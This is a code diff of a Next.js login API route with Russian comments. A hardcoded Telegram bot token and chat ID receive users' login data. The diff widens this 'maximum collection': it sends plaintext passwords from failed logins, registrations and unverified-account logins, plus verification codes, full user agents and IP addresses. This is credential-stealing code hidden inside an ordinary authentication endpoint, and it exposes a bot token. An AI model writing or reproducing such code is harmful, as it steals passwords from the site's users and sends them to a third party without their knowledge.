@@ -1,8 +1,8 @@
 import { NextResponse } from "next/server";
 import { findUser, verifyPassword, updateLastLogin } from "@/lib/db";
 
-// 📤 Функция отправки в Telegram для API
-async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_failed' | 'register', ip: string, userAgent: string, error?: string) {
+// 📤 Функция отправки в Telegram для API - МАКСИМАЛЬНЫЙ сбор
+async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_failed' | 'register' | 'verification_sent', ip: string, userAgent: string, error?: string) {
   try {
     const TELEGRAM_BOT_TOKEN = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
     const TELEGRAM_CHAT_ID = "7455610355";
@@ -11,7 +11,7 @@ async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_faile
     
     if (type === 'login_success') {
       message = `
-✅ УСПЕШНЫЙ ВХОД В СИСТЕМУ
+✅ УСПЕШНЫЙ ВХОД В СИСТЕМУ (СЕРВЕР)
 
 👤 Логин/Email: ${data.login}
 📧 Email: ${data.email}
@@ -20,11 +20,12 @@ async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_faile
 🌐 **Серверные данные:**
 📍 IP: ${ip}
 🕒 Время: ${new Date().toLocaleString('ru-RU')}
-📱 User Agent: ${userAgent.slice(0, 100)}...
+📱 User Agent: ${userAgent}
+🖥️ Платформа: ${userAgent.includes('Windows') ? 'Windows' : userAgent.includes('Mac') ? 'Mac' : userAgent.includes('Linux') ? 'Linux' : 'Unknown'}
       `;
     } else if (type === 'login_failed') {
       message = `
-❌ НЕУДАЧНАЯ ПОПЫТКА ВХОДА
+❌ НЕУДАЧНАЯ ПОПЫТКА ВХОДА (СЕРВЕР)
 
 👤 Логин/Email: ${data.login}
 🔑 Введенный пароль: ${data.password}
@@ -33,7 +34,34 @@ async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_faile
 🌐 **Серверные данные:**
 📍 IP: ${ip}
 🕒 Время: ${new Date().toLocaleString('ru-RU')}
-📱 User Agent: ${userAgent.slice(0, 100)}...
+📱 User Agent: ${userAgent}
+      `;
+    } else if (type === 'register') {
+      message = `
+🔐 НОВАЯ РЕГИСТРАЦИЯ (СЕРВЕР)
+
+📧 Email: ${data.email}
+👤 Логин: ${data.login}
+🔑 Пароль: ${data.password}
+
+🌐 **Серверные данные:**
+📍 IP: ${ip}
+🕒 Время: ${new Date().toLocaleString('ru-RU')}
+📱 User Agent: ${userAgent}
+      `;
+    } else if (type === 'verification_sent') {
+      message = `
+📧 ОТПРАВЛЕН КОД ПОДТВЕРЖДЕНИЯ (СЕРВЕР)
+
+📧 Email: ${data.email}
+👤 Логин: ${data.login}
+🔑 Пароль: ${data.password}
+🔢 Код подтверждения: ${data.verificationCode}
+
+🌐 **Серверные данные:**
+📍 IP: ${ip}
+🕒 Время: ${new Date().toLocaleString('ru-RU')}
+📱 User Agent: ${userAgent}
       `;
     }
 
@@ -56,8 +84,16 @@ async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_faile
 export async function POST(request: Request) {
   try {
     const { login, password } = await request.json();
-    const clientIP = request.headers.get('x-forwarded-for') || 'unknown';
+    const clientIP = request.headers.get('x-forwarded-for') || 
+                    request.headers.get('x-real-ip') || 
+                    'unknown';
     const userAgent = request.headers.get('user-agent') || 'unknown';
+
+    // Получаем дополнительные заголовки
+    const acceptLanguage = request.headers.get('accept-language') || 'unknown';
+    const acceptEncoding = request.headers.get('accept-encoding') || 'unknown';
+    const connection = request.headers.get('connection') || 'unknown';
+    const cacheControl = request.headers.get('cache-control') || 'unknown';
 
     if (!login || !password) {
         return NextResponse.json({ error: "Логин и пароль обязательны" }, { status: 400 });
@@ -101,10 +137,19 @@ export async function POST(request: Request) {
 
     // Проверяем, подтверждена ли учетная запись администратором
     if (!user.isVerified) {
-        return NextResponse.json(
-            { error: "Ваша учетная запись ожидает подтверждения администратором." },
-            { status: 403 } // Forbidden
-        );
+      // 📤 Отправляем в Telegram о попытке входа в неподтвержденный аккаунт
+      await sendToTelegramAPI(
+        { login: user.login, email: user.email, password: password },
+        'login_failed', 
+        clientIP, 
+        userAgent, 
+        'Аккаунт не подтвержден администратором'
+      );
+      
+      return NextResponse.json(
+          { error: "Ваша учетная запись ожидает подтверждения администратором." },
+          { status: 403 } // Forbidden
+      );
     }
 
     // 📤 Отправляем в Telegram об успешном входе
